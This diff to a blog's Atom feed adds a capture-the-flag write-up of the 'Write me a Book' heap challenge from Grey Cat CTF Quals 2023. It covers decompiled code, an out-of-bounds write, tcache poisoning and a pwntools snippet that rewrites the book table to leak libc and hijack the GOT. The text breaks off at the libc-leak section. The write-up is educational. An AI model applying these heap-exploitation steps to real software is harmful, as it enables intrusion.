@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/nasm/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/nasm/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2023-05-17T02:33:59+02:00</updated>
+    <updated>2023-05-23T17:13:53+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -17,6 +17,766 @@
             </author>
         
     <id>https://nasm.re/tags/nasm/</id>
+        
+        <entry>
+            <title type="html"><![CDATA[[Grey Cat CTF Quals 2023 - pwn] Write me a Book]]></title>
+            <link href="https://nasm.re/posts/writemeabook/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
+            <id>https://nasm.re/posts/writemeabook/</id>
+            
+            <published>2023-05-21T00:00:00+00:00</published>
+            <updated>2023-05-21T00:00:00+00:00</updated>
+            
+            
+            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
+    <h1 id="write-me-a-book">
+        Write me a book
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#write-me-a-book" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Write me a book" href="#write-me-a-book">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<blockquote>
+<p>Write me a Book
+349</p>
+<p>Give back to the library! Share your thoughts and experiences!</p>
+<p>The flag can be found in /flag</p>
+<p>Elma</p>
+<p>nc 34.124.157.94 12346</p>
+</blockquote>
+<p>Write me a book is a heap challenge I did during the <a
+  class="gblog-markdown__link"
+  href="https://nusgreyhats.org/"
+  
+  >Grey Cat The Flag 2023 Qualifiers</a
+>. You can find the tasks and the exploit <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook"
+  
+  >here</a
+>.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="tldr">
+        TL;DR
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#tldr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL;DR" href="#tldr">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>To manage to read the flag we have to:</p>
+<ul>
+<li>create overlapping chunks due to an oob write vulnerability in <code>rewrite_books</code></li>
+<li>tcache poisoning thanks to the overlapping chunks</li>
+<li>Overwrite the first entry of <code>@books</code> to then be able to rewrite 4 entries of <code>@books</code> by setting a large size.</li>
+<li>With the read / write primitives of <code>@books</code> we leak <code>&amp;stdout@glibc</code> and <code>environ</code>, this way getting a libc and stack leak.</li>
+<li>This way we can simply ROP over a given stackframe.</li>
+</ul>
+<div class="gblog-post__anchorwrap">
+    <h2 id="general-overview">
+        General overview
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#general-overview" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor General overview" href="#general-overview">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Let&rsquo;s take a look at the protections and the version of the libc:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ ./libc.so.6 
+GNU C Library <span class="o">(</span>Ubuntu GLIBC 2.35-0ubuntu3.1<span class="o">)</span> stable release version 2.35.
+Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2022</span> Free Software Foundation, Inc.
+This is free software<span class="p">;</span> see the <span class="nb">source</span> <span class="k">for</span> copying conditions.
+There is NO warranty<span class="p">;</span> not even <span class="k">for</span> MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 11.2.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+$ checksec --file ./libc.so.6 
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/libc.so.6&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div><p>So a very recent one with standards protections. Then let&rsquo;s take a look at the binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ checksec --file chall
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/chall&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x3fd000<span class="o">)</span>
+    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist&#39;</span>
+$ seccomp-tools dump ./chall
+Welcome to the library of hopes and dreams!
+
+We heard about your journey...
+and we want you to share about your experiences!
+
+What would you like your author signature to be?
+&gt; aa
+
+Great! We would like you to write no more than <span class="m">10</span> books :<span class="o">)</span>
+Please feel at home.
+ line  CODE  JT   JF      <span class="nv">K</span>
+<span class="o">=================================</span>
+ 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
+ 0001: 0x15 0x00 0x09 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0011</span>
+ 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto <span class="m">0005</span>
+ 0004: 0x15 0x00 0x06 0xffffffff  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> 0xffffffff<span class="o">)</span> goto <span class="m">0011</span>
+ 0005: 0x15 0x04 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0010</span>
+ 0006: 0x15 0x03 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> write<span class="o">)</span> goto <span class="m">0010</span>
+ 0007: 0x15 0x02 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> open<span class="o">)</span> goto <span class="m">0010</span>
+ 0008: 0x15 0x01 0x00 0x0000003c  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">exit</span><span class="o">)</span> goto <span class="m">0010</span>
+ 0009: 0x15 0x00 0x01 0x000000e7  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> exit_group<span class="o">)</span> goto <span class="m">0011</span>
+ 0010: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
+</code></pre></div><p>The binary isn&rsquo;t PIE based and does have a seccomp that allows only <code>read</code>, <code>write</code>, <code>open</code> and <code>exit</code>. Which will make the exploitation harder (but not that much).</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="code-review">
+        Code review
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#code-review" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Code review" href="#code-review">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>The <code>main</code> looks like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the library of hopes and dreams!&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">We heard about your journey...&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;and we want you to share about your experiences!&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">What would you like your author signature to be?&#34;</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+  <span class="n">LODWORD</span><span class="p">(</span><span class="n">author_signature</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span> <span class="n">yb</span><span class="err">&#39;</span><span class="p">;</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%12s&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">author_signature</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Great! We would like you to write no more than 10 books :)&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please feel at home.&#34;</span><span class="p">);</span>
+  <span class="n">secure_library</span><span class="p">();</span>
+  <span class="n">write_books</span><span class="p">();</span>
+  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Goodbye!&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>We have to give a signature (12 bytes max) sorted in <code>author_signatures</code>, then the program is allocating a lot of chunks in <code>secure_library</code>. Finally it calls <code>write_books</code> which contains the main logic:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">write_books</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">fav_num</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">print_menu</span><span class="p">();</span>
+      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
+      <span class="n">getchar</span><span class="p">();</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">1337</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">secret_msg</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is your favourite number? &#34;</span><span class="p">);</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fav_num</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">fav_num</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fav_num</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">fav_num</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You found a secret message: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">fav_num</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]);</span>
+        <span class="n">secret_msg</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+<span class="nl">LABEL_19</span><span class="p">:</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid choice.&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">1337</span> <span class="p">)</span>
+      <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="n">v3</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+      <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">choice</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+        <span class="n">throw_book</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+        <span class="n">write_book</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+        <span class="n">rewrite_book</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">default</span><span class="o">:</span>
+        <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>There are basically three handlers:</p>
+<ul>
+<li><code>1337</code>, we can leak only one time the address of a given allocated chunk.</li>
+<li><code>4</code> returns.</li>
+<li><code>3</code> free a chunk.</li>
+<li><code>1</code> add a book.</li>
+<li><code>2</code> edit a book.</li>
+</ul>
+<p>Let&rsquo;s take a quick look at each handler, first the free handler:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">throw_book</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">At which index of the shelf would you like to throw your book?&#34;</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="o">--</span><span class="n">v1</span><span class="p">]);</span>
+    <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your book has been thrown!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invaid slot!&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>It only checks is the entry exists and if the index is in the right range. if it does it frees the entry and zeroes it.</p>
+<p>Then, the add handler:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">write_book</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">idx2</span><span class="p">;</span> <span class="c1">// ebx
+</span><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rcx
+</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// rdx
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-4Ch] BYREF
+</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-48h]
+</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-40h] BYREF
+</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-20h]
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-18h]
+</span><span class="c1"></span>
+  <span class="n">v8</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">At which index of the shelf would you like to insert your book?&#34;</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="o">||</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invaid slot!&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="o">--</span><span class="n">idx</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Write me a book no more than 32 characters long!&#34;</span><span class="p">);</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">;</span>
+    <span class="n">idx2</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
+    <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
+    <span class="n">v2</span> <span class="o">=</span> <span class="n">qword_4040D8</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">author_signature</span><span class="p">;</span>
+    <span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
+    <span class="n">books</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your book has been published!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v8</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>We can allocate a chunk between <code>0x10</code> and <code>0x20 + 0x10</code> bytes and after we wrote in it the signature initially choose at the begin of the execution is put right after the end of the input.</p>
+<p>Finally comes the handler where lies the vuln, the edit handler:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">rewrite_book</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rcx
+</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rdx
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h] BYREF
+</span><span class="c1"></span>  <span class="n">ssize_t</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">At which index of the shelf would you like to rewrite your book?&#34;</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="o">--</span><span class="n">idx</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Write me the new contents of your book that is no longer than what it was before.&#34;</span><span class="p">);</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="n">books</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">size</span><span class="p">);</span>
+    <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="n">v4</span><span class="p">);</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="n">qword_4040D8</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">v0</span> <span class="o">=</span> <span class="n">author_signature</span><span class="p">;</span>
+    <span class="n">v0</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your book has been rewritten!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invaid slot!&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v5</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>As you can read there is an out of bound write if we input <code>books[idx].size</code> bytes, indeed given the chunk stores only <code>books[idx].size</code> bytes the signature writes over the current chunk. And most of the time on the header (and especially the size) of the next chunk allocated in memory resulting an overlapping chunk.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="exploitation">
+        Exploitation
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Given we can get overlapping chunks we&rsquo;re able to do tcache poisoning on the <code>0x40</code> tcachebin (to deeply understand why I advice you to read the exploit and to run it into gdb). At this point we can simply write the first entry of <code>@books</code> that is stored at a fixed memory area within the binary (no PIE). In this new entry we could write a pointer to itself but with a large size in order to be able to write several entries of <code>@books</code>. When it is done we could write these entries:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
+            <span class="c1"># 1==</span>
+            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="c1"># to leak libc</span>
+            <span class="c1"># 2==</span>
+            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span><span class="p">,</span> <span class="c1"># to do GOT hiijacking</span>
+            <span class="c1"># 3==</span>
+            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">secret_msg</span><span class="p">,</span> <span class="c1"># to be able to print an entry of @books</span>
+            <span class="c1"># 4==</span>
+            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span> <span class="c1"># ptr to itself to be able to rewrite the entries when we need to do so</span>
+        <span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</code></pre></div><p>This way we can easily leak libc.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="leaking-libc">
+        Leaking libc
